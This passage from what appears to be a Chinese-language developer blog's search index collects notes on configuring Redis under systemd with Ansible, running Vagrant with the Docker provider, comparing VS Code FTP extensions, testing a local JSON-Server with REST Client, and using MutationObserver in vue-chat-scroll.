class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Usage: /etc/init.d/redis &#123;start|stop|restart|force-reload&#125;\"</span> &gt;&amp;2</span><br><span class=\"line\">        <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">esac</span></span><br><span class=\"line\"><span class=\"comment\">##############################</span></span><br></pre></td></tr></table></figure>\n<p>我懶得從 VM 搬出來，參考<a href=\"https://zhuanlan.zhihu.com/p/73464692\" target=\"_blank\" rel=\"noopener\">Redis在Linux上的安装及相关配置 - 知乎</a></p>\n<p>但就沒有專門給 systemctl 設定用的嗎?</p>\n<p>還是有找到方法，但很多都沒有提到<br>是不是大部分 /var/run 沒有掛載到 tmpfs 上面??<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Redis In-Memory Data Store</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">PermissionsStartOnly=true</span><br><span class=\"line\">ExecStartPre=-/bin/mkdir -p /var/run/redis</span><br><span class=\"line\">ExecStartPre=-/bin/chown redis.redis /var/run/redis</span><br><span class=\"line\">#PIDFile=/var/run/redis_6379.pid  發現沒用也</span><br><span class=\"line\">User=redis</span><br><span class=\"line\">Group=redis</span><br><span class=\"line\">ExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf</span><br><span class=\"line\">ExecStop=/usr/local/bin/redis-cli shutdown</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></p>\n<p>上面 PIDFile 好像沒加也能正常跑( 可以看 /etc/redis/redis.conf 的 pidfile )<br>主要上 <code>/var/run/redis</code> 資料夾需要建立，並且權限給 redis:redis</p>\n<p>不過這個算是最佳解嗎?<br>我在這篇<a href=\"https://github.com/DavidWittman/ansible-redis/issues/132\" target=\"_blank\" rel=\"noopener\">/var/run/redis_2323 directory cannot be created in systemd service · Issue #132 · DavidWittman/ansible-redis</a>看到<br>最後解決方案<a href=\"https://github.com/DavidWittman/ansible-redis/commit/9937b2e5ec8c371f77f384b8252049e3344ffce7\" target=\"_blank\" rel=\"noopener\">Merge pull request #135 from DavidWittman/132-systemd-tmpfiles · DavidWittman/ansible-redis@9937b2e</a>使用 <code>/etc/tmpfiles.d</code><br>不過我看我現在 linux 系統沒有這個目錄</p>\n<h3 id=\"etc-tempfiles-d-最佳解法\"><a href=\"#etc-tempfiles-d-最佳解法\" class=\"headerlink\" title=\"/etc/tempfiles.d 最佳解法\"></a>/etc/tempfiles.d 最佳解法</h3><p><a href=\"https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">systemd (正體中文) - ArchWiki</a>#%E8%87%A8%E6%99%82%E6%AA%94%E6%A1%88)</p>\n<blockquote>\n<p>/usr/lib/tmpfiles.d/ 和 /etc/tmpfiles.d/ 中的檔案描述了 systemd-tmpfiles 如何創建、清理、删除臨時檔案和目錄，這些檔案和目錄通常存放在 /run 和 /tmp 中。設定檔名稱為 /etc/tmpfiles.d/<program>.conf。此處的配置能覆蓋 /usr/lib/tmpfiles.d/目錄中的同名配置。<br>臨時檔案通常和服務檔案同时提供，以生成守護程序需要的檔案和目錄。例如 Samba 服務需要目錄 /run/samba 存在並設置正確的權限位</program></p>\n</blockquote>\n<p><a href=\"https://shazi.info/ubuntu-14-04-16-04-%E5%9C%A8-reboot-%E5%BE%8C%E4%BF%9D%E7%95%99-tmp-%E5%85%A7%E7%9A%84%E6%AA%94%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">Ubuntu 16.04 \b在 reboot 後保留 tmp 內的檔案 | Mr. 沙先生</a></p>\n<p>我 Elementary OS 裡面 <code>/etc/tmpfiles.d/</code> 沒有任何東西，<code>/usr/lib/tmpfiles.d/</code> 底下有<br>不過正常應該是可以用的</p>\n<p>只要在 playbook.yml 下面加</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">create</span> <span class=\"string\">systemd</span> <span class=\"string\">tmpfiles</span> <span class=\"string\">configuration</span></span><br><span class=\"line\"><span class=\"attr\">  template:</span> <span class=\"string\">src=templates/tmpfiles_redis.conf.j2</span></span><br><span class=\"line\">            <span class=\"string\">dest=/etc/tmpfiles.d/redis.conf</span></span><br><span class=\"line\">            <span class=\"string\">mode=0644</span></span><br></pre></td></tr></table></figure>\n<p>templates/tmpfiles_redis.conf.j2<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">d &#123;&#123; redis_socket|dirname &#125;&#125; 0755 &#123;&#123; redis_user &#125;&#125; &#123;&#123; redis_group &#125;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>就可以正常了</p>\n<h3 id=\"小結\"><a href=\"#小結\" class=\"headerlink\" title=\"小結\"></a>小結</h3><p>我使用這個 playbook 不是非常完整<br>但他是我第一個網路上找到可以跑的 playbook<br>而且配置上還滿清楚的</p>\n<p>比較多完整配置可以用<a href=\"https://github.com/DavidWittman/ansible-redis\" target=\"_blank\" rel=\"noopener\">DavidWittman/ansible-redis: Highly-configurable Ansible role to install Redis and Redis Sentinel from source</a></p>\n<h2 id=\"linux-install-指令\"><a href=\"#linux-install-指令\" class=\"headerlink\" title=\"linux install 指令\"></a>linux install 指令</h2><p><a href=\"https://www.geeksforgeeks.org/install-command-in-linux-with-examples/\" target=\"_blank\" rel=\"noopener\">install command in Linux with examples - GeeksforGeeks</a></p>\n<p>簡單來說 可以複製檔案並且設定權限<br>這是我從 /etc/init/mysql.conf 看到<br>由於上面我花了一堆時間，這個就先跳過…</p>\n<h2 id=\"vagrant-搭配-docker\"><a href=\"#vagrant-搭配-docker\" class=\"headerlink\" title=\"vagrant 搭配 docker\"></a>vagrant 搭配 docker</h2><p>參考<a href=\"http://samchu.logdown.com/posts/288889-docker-fast-with-vagrant-and-construct-development-and-test-environments\" target=\"_blank\" rel=\"noopener\">使用Vagrant跟Docker快速建構開發與測試環境 « Sam的程式筆記</a></p>\n<p>執行結果<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Bringing machine &apos;elasticsearch&apos; up with &apos;docker&apos; provider...</span><br><span class=\"line\">Bringing machine &apos;postgres&apos; up with &apos;docker&apos; provider...</span><br><span class=\"line\">==&gt; elasticsearch: Pruning invalid NFS exports. Administrator privileges will be required...</span><br><span class=\"line\">[sudo] password for malagege:     </span><br><span class=\"line\">==&gt; elasticsearch: Creating the container...</span><br><span class=\"line\">    elasticsearch:   Name: elasticsearch</span><br><span class=\"line\">    elasticsearch:  Image: elasticsearch</span><br><span class=\"line\">    elasticsearch:   Port: 9200:9200</span><br><span class=\"line\">    elasticsearch:   Port: 9300:9300</span><br><span class=\"line\">A Docker command executed by Vagrant didn&apos;t complete successfully!</span><br><span class=\"line\">The command run along with the output from the command is shown</span><br><span class=\"line\">below.</span><br><span class=\"line\"></span><br><span class=\"line\">Command: [&quot;docker&quot;, &quot;run&quot;, &quot;--name&quot;, &quot;elasticsearch&quot;, &quot;-d&quot;, &quot;-p&quot;, &quot;9200:9200&quot;, &quot;-p&quot;, &quot;9300:9300&quot;, &quot;elasticsearch&quot;, &#123;:notify=&gt;[:stdout, :stderr]&#125;]</span><br><span class=\"line\"></span><br><span class=\"line\">Stderr: Unable to find image &apos;elasticsearch:latest&apos; locally</span><br><span class=\"line\">/usr/bin/docker: Error response from daemon: manifest for elasticsearch:latest not found: manifest unknown: manifest unknown.</span><br><span class=\"line\">See &apos;/usr/bin/docker run --help&apos;.</span><br></pre></td></tr></table></figure></p>\n<p>感覺電腦外層要裝 docker<br><del>NFS 掛載你的 docker unix socket 到裡面開 docker container</del><br>他就只是在 docker 開啟 container…<br>不過這樣有什麼好處… 還在想</p>\n<p>所以不能直接<code>vagrant ssh</code><br>需要使用 <code>vagrant docker-*</code> 相關指令<br><a href=\"https://stackoverflow.com/questions/37191371/vagrant-ssh-to-docker-container\" target=\"_blank\" rel=\"noopener\">drupal - Vagrant ssh to Docker container - Stack Overflow</a></p>\n<p>當初以為這是在 VM 裝 docker，直接抓 image 開啟 container<br>但跟我想的不一樣</p>\n<p>老實說這有什麼好處，我想可能用 docker-compose 會比較快吧…<br>但意外發現載入速度滿快的!!!(這不是廢話)</p>\n<h3 id=\"vagrant-ssh-登入-container\"><a href=\"#vagrant-ssh-登入-container\" class=\"headerlink\" title=\"vagrant ssh 登入 container\"></a>vagrant ssh 登入 container</h3><p>參考: <a href=\"http://blog.iwonder.tw/2017/08/20/vagrant-ssh-docker/\" target=\"_blank\" rel=\"noopener\">如何配置 Vagrant SSH 在 Docker Provider - iWonder Blog</a><br>有找到如何使用 vagrant ssh 進去</p>\n<p>dockerfile<br><figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Pull base image</span></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> ubuntu:<span class=\"number\">16.04</span></span><br><span class=\"line\"><span class=\"comment\"># Installation</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get update</span></span><br><span class=\"line\"><span class=\"bash\">RUN apt-get install -y openssh-server sudo</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># Create vagrant user with sudo privilege</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN useradd -m -d /home/vagrant -s /bin/bash vagrant</span></span><br><span class=\"line\"><span class=\"bash\">RUN <span class=\"built_in\">echo</span> <span class=\"string\">'vagrant:vagrant'</span> | chpasswd</span></span><br><span class=\"line\"><span class=\"bash\">RUN <span class=\"built_in\">echo</span> <span class=\"string\">'vagrant ALL=(ALL) NOPASSWD:ALL'</span> &gt; /etc/sudoers.d/vagrant</span></span><br><span class=\"line\"><span class=\"bash\">RUN chmod 440 /etc/sudoers.d/vagrant</span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># Run SSH service</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN mkdir /var/run/sshd</span></span><br><span class=\"line\"><span class=\"bash\">EXPOSE 22</span></span><br><span class=\"line\"><span class=\"bash\">CMD [<span class=\"string\">\"/usr/sbin/sshd\"</span>, <span class=\"string\">\"-D\"</span>]</span></span><br></pre></td></tr></table></figure></p>\n<p>Vagrantfile<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Vagrantfile</span></span><br><span class=\"line\"><span class=\"comment\"># -*- mode: ruby -*-</span></span><br><span class=\"line\">Vagrant.configure(<span class=\"string\">\"2\"</span>) <span class=\"keyword\">do</span> <span class=\"params\">|config|</span></span><br><span class=\"line\">  config.vm.provider <span class=\"string\">\"docker\"</span> <span class=\"keyword\">do</span> <span class=\"params\">|d|</span></span><br><span class=\"line\">    d.build_dir = <span class=\"string\">\".\"</span></span><br><span class=\"line\">    d.has_ssh = <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\">  config.ssh.password = <span class=\"string\">'vagrant'</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure></p>\n<p>或</p>\n<p>Vagrantfile<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Vagrantfile</span></span><br><span class=\"line\"><span class=\"comment\"># -*- mode: ruby -*-</span></span><br><span class=\"line\">Vagrant.configure(<span class=\"string\">\"2\"</span>) <span class=\"keyword\">do</span> <span class=\"params\">|config|</span></span><br><span class=\"line\">  config.vm.provider <span class=\"string\">\"docker\"</span> <span class=\"keyword\">do</span> <span class=\"params\">|d|</span></span><br><span class=\"line\">    d.image = <span class=\"string\">\"wonderchang/baseimage-ssh\"</span></span><br><span class=\"line\">    d.has_ssh = <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\">  config.ssh.password = <span class=\"string\">'vagrant'</span></span><br><span class=\"line\">  config.vm.network <span class=\"string\">\"forwarded_port\"</span>, <span class=\"symbol\">guest:</span> <span class=\"number\">80</span>, <span class=\"symbol\">host:</span> <span class=\"number\">8080</span></span><br><span class=\"line\">  config.vm.provision <span class=\"string\">\"shell\"</span>, <span class=\"symbol\">inline:</span> <span class=\"string\">&lt;&lt;-SHELL</span></span><br><span class=\"line\"><span class=\"string\">    apt-get update</span></span><br><span class=\"line\"><span class=\"string\">    apt-get install -y nginx</span></span><br><span class=\"line\"><span class=\"string\">    service nginx start</span></span><br><span class=\"line\"><span class=\"string\">  SHELL</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure></p>\n<p>vagrant up 就可以使用，vagrant ssh 就可以使用了</p>\n<h3 id=\"相關-vagrant-連結\"><a href=\"#相關-vagrant-連結\" class=\"headerlink\" title=\"相關 vagrant 連結\"></a>相關 vagrant 連結</h3><p><a href=\"https://shazi.info/%E6%80%8E%E9%BA%BC%E6%89%BE%E5%88%B0-vagrant-box-%E7%9A%84-ssh-%E4%BD%BF%E7%94%A8%E8%80%85%E8%88%87%E5%AF%86%E7%A2%BC/\" target=\"_blank\" rel=\"noopener\">怎麼找到 \bVagrant box 的 ssh 使用者與密碼 | Mr. 沙先生</a><br><a href=\"https://vagrantpi.github.io/2018/02/11/vagrant/\" target=\"_blank\" rel=\"noopener\">Vagrant 學習筆記 - VagrantPi Blog</a></p>\n<p>Using default tag: latest<br>Error response from daemon: manifest for elasticsearch:latest not found: manifest unknown: manifest unknown</p>\n<p>docker pull elasticsearch:6.5.0<br><a href=\"https://github.com/elastic/elasticsearch-docker/issues/215\" target=\"_blank\" rel=\"noopener\">Elasticsearch latest not available · Issue #215 · elastic/elasticsearch-docker</a></p>\n<p><a href=\"http://blog.iwonder.tw/2017/08/20/vagrant-ssh-docker/\" target=\"_blank\" rel=\"noopener\">如何配置 Vagrant SSH 在 Docker Provider - iWonder Blog</a></p>\n<p><a href=\"https://blog.samchu.dev/2019/07/05/Ansible-install-and-introduction/\" target=\"_blank\" rel=\"noopener\">Ansible install and introduction | SAM的程式筆記</a></p>\n","categories":["Vagrant"],"tags":["docker","vagrant","ansible"]},{"title":"vscode嘗試使用ftp套件心得","url":"/blog/2018/08/20/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/","content":"<p>Sublime Text 有一個很好用sftp套件<br>但最近換到vscode<br>很缺一個方便看ftp<br>嘗試了3個ftp套件<br><a href=\"https://marketplace.visualstudio.com/items?itemName=ruakr.ftp-kr#review-details\" target=\"_blank\" rel=\"noopener\">ftp-kr - Visual Studio Marketplace</a><br><a href=\"https://marketplace.visualstudio.com/items?itemName=humy2833.ftp-simple#review-details\" target=\"_blank\" rel=\"noopener\">ftp-simple - Visual Studio Marketplace</a><br><a href=\"https://marketplace.visualstudio.com/items?itemName=liximomo.sftp#review-details\" target=\"_blank\" rel=\"noopener\">sftp - Visual Studio Marketplace</a></p>\n<a id=\"more\"></a>\n<p>有稍微網路爬一下<a href=\"https://segmentfault.com/a/1190000012875114\" target=\"_blank\" rel=\"noopener\">Visual Studio Code几款FTP插件使用总结 - 我的笔记 - SegmentFault 思否</a><br>好像沒有好用套件<br>我也沒有需要本地端通部上傳到ftp<br>希望手動上傳</p>\n<h2 id=\"ftp-kr-Visual-Studio-Marketplace\"><a href=\"#ftp-kr-Visual-Studio-Marketplace\" class=\"headerlink\" title=\"ftp-kr - Visual Studio Marketplace\"></a><a href=\"https://marketplace.visualstudio.com/items?itemName=ruakr.ftp-kr#review-details\" target=\"_blank\" rel=\"noopener\">ftp-kr - Visual Studio Marketplace</a></h2><p>網路上看到人家推的<br>基本ftp好像不錯用<br>不過上傳會一直跳出提示視窗(不會自動關掉…)<br>這點我還滿不喜歡<br>不過可以設定多個帳號也不錯<br><img src=\"/blog/2018/08/20/vscode嘗試使用ftp套件心得/vscode_ftp_kr.gif\" title=\"Remote Explorer\"></p>\n<h2 id=\"ftp-simple-Visual-Studio-Marketplace\"><a href=\"#ftp-simple-Visual-Studio-Marketplace\" class=\"headerlink\" title=\"ftp-simple - Visual Studio Marketplace\"></a><a href=\"https://marketplace.visualstudio.com/items?itemName=humy2833.ftp-simple#review-details\" target=\"_blank\" rel=\"noopener\">ftp-simple - Visual Studio Marketplace</a></h2><p>也上網路上看到的<br>好像有看到有一篇說很像Sublime Text 的sftp套件，但是我覺得不像….<br>不過他有一個特點，上傳模式都是手動上傳<br>額且上傳本地端檔案名稱可以上傳ftp上面不一樣的檔名<br>這還有點神奇<br>假如喜歡手動設定多樣需求<br>這個一定很好用<br><img src=\"/blog/2018/08/20/vscode嘗試使用ftp套件心得/vscode_ftp_simple.gif\" title=\"ftp-simple\"></p>\n<h2 id=\"sftp-Visual-Studio-Marketplace\"><a href=\"#sftp-Visual-Studio-Marketplace\" class=\"headerlink\" title=\"sftp - Visual Studio Marketplace\"></a><a href=\"https://marketplace.visualstudio.com/items?itemName=liximomo.sftp#review-details\" target=\"_blank\" rel=\"noopener\">sftp - Visual Studio Marketplace</a></h2><p>接下來這一套是往自己搜尋到的<br>vscode預設搜尋好像照星星數排的<br>但是<code>ftp @sort:installs</code>搜尋下載數最高是這個<br>嘗試結果，看到有<strong>ftp diff功能</strong>，這個功能我覺得還滿好用的<br>基本上傳也不會跟<a href=\"https://marketplace.visualstudio.com/items?itemName=ruakr.ftp-kr#review-details\" target=\"_blank\" rel=\"noopener\">ftp-kr - Visual Studio Marketplace</a>彈出東西<br>而且有一個<strong>Remote Explorer</strong><br>可以不用再開filezilla看了XD<br><img src=\"/blog/2018/08/20/vscode嘗試使用ftp套件心得/remote-explorer.png\" title=\"Remote Explorer\"><br><img src=\"/blog/2018/08/20/vscode嘗試使用ftp套件心得/vscode_sftp.gif\" title=\"sftp\"></p>\n<h2 id=\"心得感想\"><a href=\"#心得感想\" class=\"headerlink\" title=\"心得感想\"></a>心得感想</h2><p>其實這三套嚴格說都不差<br>目前個人排名<br><code>sftp &gt; ftp-simple &gt; ftp-kr</code></p>\n","categories":["實用工具"],"tags":["vscode","sftp","ftp"]},{"title":"vscode套件Rest Client搭配JSON-Server簡單使用小記","url":"/blog/2018/09/25/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/","content":"<p>最近vscode挖到Rest Client套件<br>這個有點類似postman<br>可以直接簡單做Server溝通<br>簡單測試外，感覺還可以順便寫文件XD<br>但功能好像有點多，所以我就沒玩很深入</p>\n<a id=\"more\"></a>\n<h2 id=\"JSON-Server\"><a href=\"#JSON-Server\" class=\"headerlink\" title=\"JSON-Server\"></a>JSON-Server</h2><p>首先可以先裝JSON-Server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g json-server</span><br></pre></td></tr></table></figure>\n<p>設定<code>db.json</code>(注意:一定要xxx.json)<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"posts\"</span>:[]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>存檔<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">json-server db.json</span><br></pre></td></tr></table></figure></p>\n<p>簡單就架好一個Restful 測試Server XD<br>想說要模擬分頁、搜尋沒辦法做到<br>結果一看他的文件<br>竟然可以做到<a href=\"https://github.com/typicode/json-server#paginate\" target=\"_blank\" rel=\"noopener\">typicode/json-server: Get a full fake REST API with zero coding in less than 30 seconds (seriously) #paginate</a><br>最近要練VueJS<br>剛好可以用這個練習</p>\n<p><strong>NOTE 2018/09/26</strong><br><code>json-server db.json --static .</code>可設定<code>index.html</code>可以直接連<a href=\"http://localhost/index.html\" target=\"_blank\" rel=\"noopener\">http://localhost/index.html</a></p>\n<h2 id=\"REST-Client\"><a href=\"#REST-Client\" class=\"headerlink\" title=\"REST Client\"></a>REST Client</h2><p><code>###</code>用來當分格線</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">###</span><br><span class=\"line\"># 取得資料</span><br><span class=\"line\">GET http://localhost:3000/posts</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Content-Type 可以參考</span><br><span class=\"line\"># [四种常见的 POST 提交数据方式 | JerryQu 的小站](https://imququ.com/post/four-ways-to-post-data-in-http.html)</span><br><span class=\"line\">### 新增資料</span><br><span class=\"line\"></span><br><span class=\"line\">POST http://localhost:3000/posts  HTTP/1.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\"></span><br><span class=\"line\">test=2&amp;a=1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#  傳JSON，一定要加content-type: application/json 一定要填寫，不然會錯</span><br><span class=\"line\">###</span><br><span class=\"line\"># 新增資料</span><br><span class=\"line\">POST http://localhost:3000/posts  HTTP/1.1</span><br><span class=\"line\">content-type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;test&quot; : 2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">###</span><br><span class=\"line\"># PUT 更新資料</span><br><span class=\"line\">PUT http://localhost:3000/posts/1  HTTP/1.1</span><br><span class=\"line\">content-type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;test2&quot; : &quot;3&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">###</span><br><span class=\"line\"># DELETE 刪除資料</span><br><span class=\"line\">DELETE http://localhost:3000/posts/1  HTTP/1.1</span><br><span class=\"line\">content-type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;test2&quot; : &quot;3&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img src=\"/blog/2018/09/25/vscode套件Rest-Client搭配JSON-Server簡單使用小記/1.png\" title=\"查詢請按紅框\">\n<p><a href=\"https://github.com/Huachao/vscode-restclient\" target=\"_blank\" rel=\"noopener\">Huachao/vscode-restclient: REST Client Extension for Visual Studio Code</a><br>功能真的太多了…</p>\n<a href=\"/blog/2018/09/25/vscode套件Rest-Client搭配JSON-Server簡單使用小記/vscode套件Rest-Client搭配JSON-Server簡單使用小記.zip\" title=\"範例檔案\">範例檔案</a>"},{"title":"vue-chat-scroll和MutationObserver小記","url":"/blog/2018/10/24/vue-chat-scroll%E5%92%8CMutationObserver%E5%B0%8F%E8%A8%98/","content":"<p>最近突然想起以前看到有一個加項目，卷軸超過其範圍會自動往下<br>印象中…是個DOM改變會自動偵測<br>所以我以為是listiner<br>但不是….</p>\n<a id=\"more\"></a>\n<p><a href=\"https://github.com/theomessin/vue-chat-scroll\" target=\"_blank\" rel=\"noopener\">theomessin/vue-chat-scroll: Automatic scroll-to-bottom directive for vue.</a><br><a href=\"http://sj82516-blog.logdown.com/posts/3095129\" target=\"_blank\" rel=\"noopener\">Vue 插件開發 - 聊天視窗滾動與自動加載，關於MutationObserver/Custom Directive « YJ Blog</a></p>\n<p>簡單，使用就不說了</p>\n<p>原理是用MutationObserver<br>但是不管DOM修改1000次，做rendering才會觸發<br>小玩官網範例<a href=\"https://theomessin.github.io/vue-chat-scroll/\" target=\"_blank\" rel=\"noopener\">vue-chat-scroll</a><br>可以看以下我小玩Promise</p>\n<p>官網是for一次回圈非同步處理，所以才會觸發很多次MutationObserver</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"pushMsg\"</span>&gt;</span>add item<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>message<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"messages\"</span> <span class=\"attr\">v-chat-scroll</span>=<span class=\"string\">\"&#123;always: false&#125;\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"message\"</span> <span class=\"attr\">v-for</span>=<span class=\"string\">\"n in messages\"</span> <span class=\"attr\">:key</span>=<span class=\"string\">\"n\"</span>&gt;</span>&#123;&#123; n &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">pushMsg()&#123;</span><br><span class=\"line\">        <span class=\"comment\">// for (let i = 0 ; i &lt; 30 ; i++)</span></span><br><span class=\"line\">        <span class=\"comment\">// fetch('https://baconipsum.com/api/?type=meat-and-filler&amp;sentences=1&amp;start-with-lorem=1').then(function (response) &#123;</span></span><br><span class=\"line\">        <span class=\"comment\">//   return response.json()</span></span><br><span class=\"line\">        <span class=\"comment\">// &#125;).then(data =&gt; this.messages.push(data[0]))</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span> ; i &lt; <span class=\"number\">30</span> ; i++)</span><br><span class=\"line\">        temp.push(fetch(<span class=\"string\">'https://baconipsum.com/api/?type=meat-and-filler&amp;sentences=1&amp;start-with-lorem=1'</span>).then(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">response</span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> response.json()</span><br><span class=\"line\">        &#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">Promise</span>.all(temp).then(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data.forEach(<span class=\"function\"><span class=\"params\">e</span> =&gt;</span> <span class=\"keyword\">this</span>.messages.push(e)))</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// for (let i = 0 ; i &lt; 30 ; i++)</span></span><br><span class=\"line\">        <span class=\"comment\">//   this.messages.push(\"data[0]\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"MutationObserver\"><a href=\"#MutationObserver\" class=\"headerlink\" title=\"MutationObserver\"></a>MutationObserver</h2><p>簡單紀錄一下<br>MutationObserver 如上面所說<code>不管DOM修改1000次，做rendering才會觸發</code><br>所以它也不算一個listener原因</p>\n<p>除了範例對節點，它還可以對<code>屬性</code>、<code>內容</code>、<code>子層html</code><br>詳細看文件<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/MutationObserver\" target=\"_blank\" rel=\"noopener\">MutationObserver - Web APIs | MDN</a></p>\n<p>由於很少網站資訊介紹MutationObserver<br><a href=\"http://javascript.ruanyifeng.com/dom/mutationobserver.html\" target=\"_blank\" rel=\"noopener\">Mutation Observer API – JavaScript 标准参考教程（alpha）</a><br>這個網站算介紹滿清楚的<br><a href=\"/blog/2018/10/24/vue-chat-scroll和MutationObserver小記/web_bk.png\" title=\"備份圖\">備份圖</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var article = document.querySelector(&apos;article&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">var  options = &#123;</span><br><span class=\"line\">  &apos;childList&apos;: true,</span><br><span class=\"line\">  &apos;attributes&apos;:true</span><br><span class=\"line\">&#125; ;</span><br><span class=\"line\"></span><br><span class=\"line\">observer.observe(article, options);</span><br><span class=\"line\"></span><br><span class=\"line\">上面代码中，observe方法接受两个参数，第一个是所要观察的DOM元素是article，第二个是所要观察的变动类型（子节点变动和属性变动）。</span><br><span class=\"line\"></span><br><span class=\"line\">观察器所能观察的 DOM 变动类型（即上面代码的options对象），有以下几种。</span><br><span class=\"line\"></span><br><span class=\"line\">    childList：子节点的变动（指新增，删除或者更改）。</span><br><span class=\"line\">    attributes：属性的变动。</span><br><span class=\"line\">    characterData：节点内容或节点文本的变动。</span><br><span class=\"line\"></span><br><span class=\"line\">想要观察哪一种变动类型，就在option对象中指定它的值为true。需要注意的是，必须同时指定childList、attributes和characterData中的一种或多种，若未均指定将报错。</span><br><span class=\"line\"></span><br><span class=\"line\">除了变动类型，options对象还可以设定以下属性：</span><br><span class=\"line\"></span><br><span class=\"line\">    subtree：布尔值，表示是否将该观察器应用于该节点的所有后代节点。</span><br><span class=\"line\">    attributeOldValue：布尔值，表示观察attributes变动时，是否需要记录变动前的属性值。</span><br><span class=\"line\">    characterDataOldValue：布尔值，表示观察characterData变动时，是否需要记录变动前的值。</span><br><span class=\"line\">    attributeFilter：数组，表示需要观察的特定属性（比如[&apos;class&apos;,&apos;src&apos;]）。</span><br><span class=\"line\"></span><br><span class=\"line\">// 开始监听文档根节点（即&lt;html&gt;标签）的变动</span><br><span class=\"line\">mutationObserver.observe(document.documentElement, &#123;</span><br><span class=\"line\">  attributes: true,</span><br><span class=\"line\">  characterData: 